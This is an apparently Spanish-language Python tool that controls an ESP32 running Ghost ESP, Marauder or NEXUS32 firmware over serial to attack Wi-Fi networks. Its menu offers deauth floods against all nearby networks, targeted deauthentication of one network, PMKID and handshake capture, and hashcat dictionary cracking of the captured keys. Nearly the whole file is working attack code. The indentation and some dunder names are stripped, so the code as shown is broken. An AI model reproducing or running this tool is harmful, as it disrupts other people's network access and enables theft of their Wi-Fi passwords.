#!/usr/bin/env python3


import os, sys, re, time, threading, subprocess, shutil, datetime
try:
import serial
except ImportError:
print("Falta pyserial. Ejecuta: py -m pip install pyserial"); sys.exit(1)

PUERTO = sys.argv[1].upper() if len(sys.argv) > 1 else "COM7"
BASE = os.path.dirname(os.path.abspath(file))
CAPS = os.path.join(BASE, "capturas"); os.makedirs(CAPS, exist_ok=True)
LOG = os.path.join(BASE, "nexus.log")
CFG = os.path.join(BASE, "nexus.cfg")

E = "\033["; R = E+"38;2;229;32;42m"; G = E+"38;2;0;210;90m"; W = E+"38;2;236;236;236m"
GR = E+"38;2;128;128;128m"; D = E+"38;2;64;64;64m"; C = E+"38;2;0;180;216m"; A = E+"38;2;255;176;0m"; X = E+"0m"

ANSI = re.compile(r"\x1b[[0-9;][A-Za-z]")
MAC = re.compile(r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})")
RCH = re.compile(r"(?i)\bch\s[:=]?\s*(\d+)")
RRSSI = re.compile(r"(?i)rssi\s*[:=]?\s*(-?\d+)")
RSSID = re.compile(r"(?i)ssid\s*[:=]\s*(.?)(?=\s+(?:bssid|ch|rssi|idx)\b|\s$)")
RIDX = re.compile(r"^\s*[?(\d+)]?[).:]")
PROMPT = re.compile(r"(?:ghost|marauder)?\s*[#>]\s*$", re.I)
BANNER_G = re.compile(r"ghost\sesp|ghostesp", re.I)
BANNER_M = re.compile(r"esp32\smarauder|marauder\s*v\d", re.I)

VOLCADOS = ["list -b", "list -f", "list -x", "list -m"]
CAND = {"GHOST": ["sniffbeacon", "scanap", "scanall", "scan"],
"MARAUDER": ["scanap", "sniffbeacon"],
"NEXUS32": ["scan"]}
MARCAS_G = {"list", "select", "blespam", "spoofat", "sniffskim", "findmy", "clearlist"}
MARCAS_M = {"settings", "scanall", "reboot", "info", "packetcount"}

CMDS = {
"GHOST": dict(scan="sniffbeacon", stop="stopscan", ch="channel -s {ch}", pmkid="sniffpmkid",
hand="sniffraw", select="select -a {i}", selssid='select -f "contains {s}"',
limpia="clearlist", deauth="attack -t deauth", flood="attack -t deauth", ls="list -b"),
"MARAUDER": dict(scan="scanap", stop="stopscan", ch="channel -s {ch}", pmkid="sniffpmkid -d -c {ch}",
hand="sniffraw", deauth="attack -t deauth -a {b} -c {ch}",
flood="attack -t deauth", ls="ls"),
"NEXUS32": dict(scan="SCAN {ms}", stop="STOP", ch="CHANNEL {ch}", pmkid="PMKID {ch}",
hand="RAW", deauth="DEAUTH {b}", flood="DEAUTH FLOOD", ls="LS"),
}

def limpia(): os.system("cls" if os.name == "nt" else "clear")
def log(t):
try:
with open(LOG, "a", encoding="utf-8") as f: f.write(t + "\n")
except Exception: pass
def cola(n=14):
try:
with open(LOG, encoding="utf-8") as f: l = f.readlines()[-n:]
except Exception: l = []
return "".join(f" {D}{x.rstrip()}{X}\n" for x in l)
def cfg_le():
try:
with open(CFG, encoding="utf-8") as f: return f.read().strip().upper()
except Exception: return ""
def cfg_es(fw):
try:
with open(CFG, "w", encoding="utf-8") as f: f.write(fw)
except Exception: pass

def cabecera(fw, n, est):
print()
print(R + r" _ __ ______ __ __ _ __ ______ ____ " + X)
print(R + r" / |/ // / / / / // | | / // / / / / " + X)
print(R + r" / // / / / / // | |/ // / / /\ \ " + X)
print(R + r"//|/// ///|/|/// /// " + X)
print(D + " ┌" + "─"*52 + "┐" + X)
print(f" {D}│{X} {W}PUERTO:{X} {PUERTO:<38}{D}│{X}")
print(f" {D}│{X} {W}ESTADO:{X} {est:<38}{D}│{X}")
print(f" {D}│{X} {W}FIRMWARE:{X} {C}{fw or '—':<37}{X}{D}│{X}")
print(f" {D}│{X} {W}CAPTURAS:{X} {A}{n:<37}{X}{D}│{X}")
print(D + " └" + "─"*52 + "┘" + X); print()

def menu():
print(f" {R}[1]{X} {W}Ver redes cercanas{X}")
print(f" {R}[2]{X} {W}Tirar TODAS las redes{X} {GR}deauth flood{X}")
print(f" {R}[3]{X} {W}Tirar UNA red{X} {GR}deauth dirigido{X}")
print(f" {R}[4]{X} {W}Capturar PMKID{X} {GR}por puerto, sin SD{X}")
print(f" {R}[5]{X} {W}Romper clave capturada{X} {GR}hashcat en el PC{X}")
print(f" {R}[6]{X} {W}Parar todo{X}")
print(f" {R}[7]{X} {W}Grabar firmware (.bin){X}")
print(f" {R}[8]{X} {W}Diagnostico{X}")
print(f" {R}[9]{X} {W}Capturar handshake{X} {GR}necesita SD{X}")
print(f" {R}[f]{X} {W}Forzar firmware{X} {GR}GHOST / MARAUDER / NEXUS32{X}")
print(f" {R}[0]{X} {W}Salir{X}"); print()

class Esp:
def init(self):
self.s = None; self.fw = None; self.aps = {}; self.hashes = []
self.cap = None; self.on = False; self.caps = set()
self.listo = threading.Event(); self.err = None; self.echo = None
self.n_recv = 0; self.n_mac = 0; self.n_ch = 0; self.n_rssi = 0; self.n_ssid = 0; self.n_ap = 0
self.crudo = []; self.pidiendo = 0.0

def abre(self):
try:
self.s = serial.Serial(PUERTO, 115200, timeout=0.3)
except Exception as e:
return str(e)
time.sleep(1.5)
self.s.reset_input_buffer()
self.on = True
t0 = time.time()
while time.time() - t0 < 2.0:
raw = self.s.readline()
if raw:
t = raw.decode("utf-8", "replace").strip()
if t: self.procesa(t)
threading.Thread(target=self.escucha, daemon=True).start()
return None

def sondea(self):
if not self.s: return None
self.pidiendo = time.time() + 4.0
self.listo.clear()
self.s.write(b"\n"); time.sleep(0.3)
self.s.write(b"help\n")
t0 = time.time()
while time.time() - t0 < 3.0 and not self.caps: time.sleep(0.2)
if not self.fw: self.decide()
return self.fw

def decide(self):
if self.fw: return self.fw
if self.caps & MARCAS_G: self.fw = "GHOST"
elif self.caps & MARCAS_M: self.fw = "MARAUDER"
elif BANNER_G.search(" ".join(self.crudo)): self.fw = "GHOST"
elif BANNER_M.search(" ".join(self.crudo)): self.fw = "MARAUDER"
return self.fw

def txt(self, cmd):
if not self.s: return "sin puerto"
self.listo.clear(); self.err = None
self.echo = cmd.strip().lower()
try: self.s.write((cmd + "\n").encode())
except Exception as ex: return str(ex)
self.listo.wait(2.5)
return self.err

def envia(self, k, **kw):
if not self.s or not self.fw or k not in CMDS.get(self.fw, {}): return False
return self.txt(CMDS[self.fw][k].format(**kw)) is None

def manda(self, k, **kw):
if not self.envia(k, **kw): return f"'{k}' no disponible"
return self.err

def escucha(self):
while self.on and self.s:
try: raw = self.s.readline()
except Exception: break
if not raw: continue
t = raw.decode("utf-8", "replace").strip()
if t: self.procesa(t)

def pinta(self, ssid, b, ch, rssi):
print(f"\r{' '*78}\r {G}+{X} {W}{ssid[:28]:<28}{X} {GR}{b} ch{ch} {rssi}dBm{X}")

def procesa(self, t):
log(t); self.n_recv += 1
limpio = ANSI.sub("", t); low = limpio.lower()
self.crudo.append(limpio)
if len(self.crudo) > 40: self.crudo.pop(0)
if not self.fw:
if BANNER_G.search(limpio): self.fw = "GHOST"
elif BANNER_M.search(limpio): self.fw = "MARAUDER"
elif low.startswith("status:") or "nexus32" in low: self.fw = "NEXUS32"
if time.time() < self.pidiendo:
m = re.match(r"^\s*([a-z]{3,})(\s|$)", low)
if m: self.caps.add(m.group(1))
if self.echo and limpio.startswith("#") and self.echo in low: self.listo.set()
if PROMPT.search(limpio): self.listo.set()
if "unknown command" in low or "not found" in low or "invalid" in low: self.err = limpio
m = re.search(r"EVT:AP:([0-9a-fA-F:]{17})|(.?)|(\d+)|(-?\d+)", limpio)
if m:
b = m.group(1).lower()
if b not in self.aps: self.pinta(m.group(2), b, m.group(3), m.group(4))
self.aps[b] = (m.group(2), m.group(3), m.group(4), ""); self.n_ap += 1; return
mac = MAC.search(limpio); ch = RCH.search(limpio); rs = RRSSI.search(limpio)
ss = RSSID.search(limpio); idx = RIDX.match(limpio)
if mac: self.n_mac += 1
if ch: self.n_ch += 1
if rs: self.n_rssi += 1
if ss: self.n_ssid += 1
if mac and (ch or rs or ss or idx):
b = mac.group(1).lower()
if ss:
ssid = ss.group(1).strip(" []"'") or "<oculta>"
else:
corte = ch.start() if ch else mac.start()
pre = limpio[:corte].replace(mac.group(1), "")
pre = re.sub(r"(?i)bssid:\s", "", pre)
pre = re.sub(r"^\s*[\d+]\s*", "", pre)
pre = re.sub(r"(?i)^\sssid:\s", "", pre)
ssid = " ".join(pre.replace("[", " ").replace("]", " ").split()) or "<sin ssid>"
c = ch.group(1) if ch else "?"
r = rs.group(1) if rs else "-99"
i = idx.group(1) if idx else ""
if b not in self.aps: self.pinta(ssid, b, c, r)
viejo = self.aps.get(b)
if viejo and viejo[3] and not i: i = viejo[3]
self.aps[b] = (ssid, c, r, i); self.n_ap += 1; return
m = re.search(r"(WPA0[12][0-9a-fA-F*]+)", limpio)
if m and m.group(1) not in self.hashes:
self.hashes.append(m.group(1))
if not self.cap: self.cap = os.path.join(CAPS, datetime.datetime.now().strftime("clave_%Y%m%d_%H%M%S.22000"))
with open(self.cap, "a", encoding="utf-8") as f: f.write(m.group(1) + "\n")
print(f"\n {G}[◆] CAPTURA {len(self.hashes)} GUARDADA{X}"); return

def espera(e, seg, txt):
t0 = time.time()
try:
while time.time() - t0 < seg:
time.sleep(0.4)
he = int(time.time() - t0)
print(f"\r {C}{txt}{X} {D}| {he:>3}s/{seg}s | cap={len(e.hashes)} | "
f"redes={len(e.aps)}{X} ", end="", flush=True)
except KeyboardInterrupt:
e.txt("stopscan")
print()

def volcar(e, seg=1.2):
for d in VOLCADOS:
antes = len(e.aps)
e.txt(d); time.sleep(seg)
if len(e.aps) > antes: return d
return None

def indexar(e):
"""Pide list -b para que cada BSSID reciba su indice de seleccion."""
if e.fw != "GHOST": return 0
e.txt("list -b"); time.sleep(1.6)
return sum(1 for d in e.aps.values() if d[3])

def arranca_scan(e, seg=5):
for c in CAND.get(e.fw, ["scanap"]):
antes = e.n_mac
e.txt(c)
espera(e, seg, f"PROBANDO {c}")
e.txt("stopscan")
if e.n_mac > antes: return c
return None

def pedir(txt, defx):
v = input(f" {GR}{txt} [{defx}] > {X}").strip()
return v or defx

def elegir(e):
if not e.aps: print(f" {R}[!] Usa primero [1].{X}"); return None
it = sorted(e.aps.items(), key=lambda kv: (kv[1][2] == "-99", -int(kv[1][2])))
for i, (b, d) in enumerate(it, 1):
print(f" {R}[{i:>2}]{X} {W}{d[0][:26]:<26}{X} {GR}{b} ch{d[1]} {d[2]}dBm idx={d[3] or '—'}{X}")
try:
b, d = it[int(input(f" {GR}numero > {X}").strip()) - 1]
return b, d[1], d[3], d[0]
except Exception:
print(f" {R}[!] invalido{X}"); return None

def selecciona(e, idx, ssid):
"""Selecciona por indice y, si no hay, por ssid."""
if e.fw != "GHOST": return None
if idx: return e.manda("select", i=idx)
if ssid and ssid not in ("<oculta>", "<sin ssid>"):
return e.manda("selssid", s=ssid)
return "sin indice ni ssid para seleccionar"

def revisa(err, que):
if err: print(f" {A}[!] {que}: {err}{X}")

def diag(e):
while True:
limpia()
print(f"\n {W}DIAGNOSTICO{X} {D}puerto {PUERTO} · firmware {e.fw or '—'}{X}\n")
print(f" {R}[1]{X} estado, eco y capacidades")
print(f" {R}[2]{X} volcar 25 lineas crudas nuevas")
print(f" {R}[3]{X} probar cada comando de escaneo 5 s")
print(f" {R}[4]{X} probar los cuatro list a mano")
print(f" {R}[5]{X} ultimas 30 lineas del log")
print(f" {R}[0]{X} volver\n")
s = input(f" {R}diag{X}{GR} > {X}").strip(); print()
if s == "1":
print(f" firmware: {e.fw or '—'}")
print(f" comandos vistos en help: {len(e.caps)} {D}{', '.join(sorted(e.caps)[:14])}{X}")
print(f" lineas: {e.n_recv} MAC: {e.n_mac} Ch: {e.n_ch} RSSI: {e.n_rssi} SSID: {e.n_ssid} redes: {e.n_ap}")
print(f" con indice: {sum(1 for d in e.aps.values() if d[3])} con ssid real: {sum(1 for d in e.aps.values() if d[0] not in ('<oculta>','<sin ssid>'))}")
n = e.n_recv; t0 = time.time()
try: e.s.write(b"\n")
except Exception: pass
time.sleep(1.0)
print(f" eco en vacio: {G+'si (%.2fs)' % (time.time()-t0)+X if e.n_recv > n else A+'no imprime nada (normal en Ghost)'+X}")
elif s == "2":
n = e.n_recv
try: e.s.write(b"\n")
except Exception: pass
print(f" {D}(4 s escuchando){X}\n")
t0 = time.time()
while time.time() - t0 < 4: time.sleep(0.2)
print(cola(max(e.n_recv - n, 1)) if e.n_recv > n else f" {A}(no llego nada nuevo){X}")
elif s == "3":
if e.fw == "GHOST": e.txt("clearlist")
for c in CAND.get(e.fw, ["scanap"]):
m0, a0, s0 = e.n_mac, e.n_ap, e.n_ssid
print(f" {D}> {c}{X}")
err = e.txt(c)
espera(e, 5, "sondeando")
e.txt("stopscan")
print(f" MAC nuevas: {e.n_mac-m0} redes: {e.n_ap-a0} con SSID: {e.n_ssid-s0}" + (f" {A}{err}{X}" if err else ""))
if e.n_ap > a0: print(f" {G}'{c}' funciona: es el motor.{X}"); break
if e.crudo: print(f"\n {D}muestra cruda:{X}\n" + "".join(f" {D}{x[:70]}{X}\n" for x in e.crudo[-6:]))
elif s == "4":
for d in VOLCADOS:
antes = len(e.aps)
print(f" {D}> {d}{X}")
err = e.txt(d); time.sleep(1.5)
print(f" entradas nuevas: {len(e.aps)-antes}" + (f" {A}{err}{X}" if err else ""))
elif s == "5": print(cola(30) or f" {A}(log vacio){X}")
elif s == "0": return
input(f"\n {D}Enter...{X}")

def romper():
fs = sorted(f for f in os.listdir(CAPS) if f.endswith((".22000",".cap",".pcap",".pcapng")))
if not fs: print(f" {R}[!] sin capturas{X}"); return
for i, f in enumerate(fs, 1): print(f" {R}[{i}]{X} {W}{f}{X}")
try: f = os.path.join(CAPS, fs[int(input(f" {GR}archivo > {X}").strip())-1])
except Exception: print(f" {R}[!] invalido{X}"); return
if f.endswith((".pcap",".pcapng")):
conv = shutil.which("hcxpcapngtool")
if not conv: print(f" {A}[!] falta hcxpcapngtool para pasar ese pcap{X}"); return
sal = os.path.splitext(f)[0] + ".22000"
subprocess.run([conv, "-o", sal, f])
if not os.path.isfile(sal): print(f" {R}[!] el pcap no tiene handshake utilizable{X}"); return
f = sal
wl = input(f" {GR}diccionario > {X}").strip().strip('"')
if not os.path.isfile(wl): print(f" {R}[!] diccionario invalido{X}"); return
hc = shutil.which("hashcat") or shutil.which("hashcat.exe")
if not hc: print(f" {A}[!] hashcat no esta en PATH{X}"); return
sal = os.path.join(CAPS, "encontradas.txt")
subprocess.run([hc,"-m","22000","-a","0","-D","1","-w","3","--status","--status-timer","2","-o",sal,f,wl])
if os.path.isfile(sal):
print(f"\n {G}[✔] {sal}{X}")
with open(sal, encoding="utf-8", errors="replace") as fh: print(f" {W}{fh.read().strip()}{X}")
else: print(f"\n {A}[!] sin resultado con ese diccionario{X}")

def grabar(e):
b = input(f" {GR}ruta del .bin > {X}").strip().strip('"')
if not os.path.isfile(b): print(f" {R}[!] no existe{X}"); return
print(f"\n {A}Manten BOOT, pulsa EN, suelta EN, suelta BOOT.{X}")
input(f" {D}Cuando estes listo, Enter...{X}")
e.on = False; e.fw = None
try: e.s.close()
except Exception: pass
time.sleep(0.8)
for args in (["--chip","esp32","--port",PUERTO,"--baud","460800","erase-flash"],
["--chip","esp32","--port",PUERTO,"--baud","460800","write-flash","-z","0x0",b]):
subprocess.run([sys.executable, "-m", "esptool"] + args)
time.sleep(0.8)
try:
e.s = serial.Serial(PUERTO, 115200, timeout=0.3)
e.on = True
threading.Thread(target=e.escucha, daemon=True).start()
except Exception as ex:
print(f" {R}[!] no pude reabrir {PUERTO}: {ex}{X}")
print(f"\n {G}[✔] Pulsa EN en la placa para arrancar.{X}")

def main():
if os.name == "nt": os.system("chcp 65001 >nul 2>nul")
limpia()
e = Esp()
forzado = cfg_le()
if forzado in CMDS: e.fw = forzado
err = e.abre()
if err:
cabecera(None, 0, R + "NO ABIERTO" + X)
print(f" {R}[!] {err}{X}\n")
print(f" {W}1.{X} El puerto {PUERTO} tiene que existir en el Administrador de dispositivos.")
print(f" {W}2.{X} Cierra Arduino IDE y cualquier monitor serie.")
print(f" {W}3.{X} Otro COM: {C}py nexus.py COM9{X}\n")
input(f" {D}Enter...{X}"); return
e.sondea()
while True:
limpia()
est = G + "FIRMWARE OK" + X if e.fw else A + "SIN RESPUESTA — pulsa EN, o [8]" + X
cabecera(e.fw, len(e.hashes), est); menu()
op = input(f" {R}nexus{X}{GR} > {X}").strip(); print()
if op == "1":
seg = int(pedir("Segundos", "25"))
e.aps.clear()
if e.fw == "GHOST": e.txt("clearlist")
usado = arranca_scan(e)
if usado:
print(f" {G}motor: {usado}{X}")
e.txt(usado); espera(e, seg, "BUSCANDO"); e.manda("stop")
else:
print(f" {A}[!] ningun comando de escaneo devuelve tramas. Mira [8]3.{X}")
if e.fw == "GHOST" and e.aps:
n = indexar(e)
print(f" {D}indices obtenidos: {n}/{len(e.aps)}{X}")
if not e.aps: volcar(e)
con_ssid = sum(1 for d in e.aps.values() if d[0] not in ("<oculta>", "<sin ssid>"))
print(f"\n {G}[✔] {len(e.aps)} redes, {con_ssid} con nombre{X}" if e.aps else f" {A}[!] ninguna red.{X}")
if e.aps and not con_ssid: print(f" {A}[!] todas sin SSID: manda [8]2 con list -b y lo ajusto.{X}")
elif op == "2":
seg = int(pedir("Segundos", "60"))
if e.fw == "GHOST": e.manda("limpia")
revisa(e.manda("flood"), "no arranca el flood")
espera(e, seg, "TIRANDO TODAS"); e.manda("stop")
elif op == "3":
t = elegir(e)
if t:
seg = int(pedir("Segundos", "60"))
revisa(e.manda("ch", ch=t[1]), "no cambia de canal")
revisa(selecciona(e, t[2], t[3]), "no selecciona la red")
revisa(e.manda("deauth", b=t[0], ch=t[1]), "no arranca el deauth")
espera(e, seg, f"TIRANDO {t[0]}"); e.manda("stop")
elif op == "4":
t = elegir(e)
if t:
seg = int(pedir("Segundos", "120")); e.cap = None
revisa(e.manda("ch", ch=t[1]), "no cambia de canal")
revisa(selecciona(e, t[2], t[3]), "no selecciona la red")
err = e.manda("pmkid", ch=t[1])
if err and e.fw == "GHOST": err = e.txt("sniffpmkid -c " + t[1])
revisa(err, "no arranca la captura")
espera(e, seg, "CAPTURANDO PMKID"); e.manda("stop")
print(f" {G}[✔] {e.cap}{X}" if e.hashes else f" {A}[!] nada. Prueba una red con clientes conectados.{X}")
elif op == "5": romper()
elif op == "6": e.manda("stop"); print(f" {A}parado{X}")
elif op == "7": grabar(e)
elif op == "8": diag(e)
elif op == "9":
t = elegir(e)
if t:
seg = int(pedir("Segundos", "120"))
revisa(e.manda("ch", ch=t[1]), "no cambia de canal")
revisa(selecciona(e, t[2], t[3]), "no selecciona la red")
err = e.manda("hand", ch=t[1])
if err and e.fw == "GHOST": err = e.txt("sniffeapol")
revisa(err, "no arranca el sniffer")
espera(e, seg, "ESPERANDO EAPOL"); e.manda("stop")
print(f" {D}los .pcap quedan en la SD; sacala y usa [5].{X}")
elif op == "f":
q = input(f" {GR}GHOST / MARAUDER / NEXUS32 > {X}").strip().upper()
if q in CMDS: e.fw = q; cfg_es(q); print(f" {G}forzado {q}{X}")
elif q in ("", "AUTO"): e.fw = None; cfg_es(""); print(f" {G}deteccion automatica{X}")
else: print(f" {R}[!] invalido{X}")
elif op == "0":
e.on = False; e.txt("stopscan"); time.sleep(0.3)
try: e.s.close()
except Exception: pass
limpia(); print(f"\n {R}[ desconectado ]{X}\n"); break
elif op: print(f" {R}[!] opcion invalida{X}")
input(f"\n {D}Enter...{X}")

if name == "main": main()